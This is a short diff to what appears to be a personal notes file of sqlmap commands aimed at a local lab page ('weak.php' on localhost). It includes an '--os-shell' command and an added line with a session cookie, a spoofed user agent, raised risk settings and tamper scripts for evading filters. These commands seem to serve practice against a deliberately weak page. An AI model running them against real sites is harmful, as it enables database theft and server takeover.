@@ -18,3 +18,5 @@ C:\xampp\htdocs
 python sqlmap.py -u "http://localhost/weak.php?id=10" --sql-query="select now();"
 </br>
 python sqlmap.py -u "http://localhost/weak.php?id=10" --os-shell
+</br>
+python sqlmap.py -u "http://localhost/weak.php?id=10" --level=3 --risk=2 --cookie="PHPSESSID:1r4fk7m10s3sj0nkbgdu1a48v0" --batch -v2 -o --keep-alive --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --no-cast --no-escape --tamper="space2comment,between"
